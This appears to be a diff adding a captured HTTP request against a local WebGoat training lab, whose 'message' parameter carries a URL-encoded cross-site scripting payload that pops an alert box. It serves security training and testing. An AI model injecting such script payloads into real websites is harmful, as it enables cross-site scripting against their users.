@@ -1,0 +1,10 @@
+GET /WebGoat/attack?Screen=268&menu=900&title=Test&message=%3Cscript%3Ealert(%22attack%22)%3C%2Fscript%3E&SUBMIT=Submit HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:42.0) Gecko/20100101 Firefox/42.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Referer: http://localhost:8080/WebGoat/start.mvc
+Cookie: JSESSIONID=CE60351F53A5FA1999D9021FBB0F56E1
+Connection: keep-alive
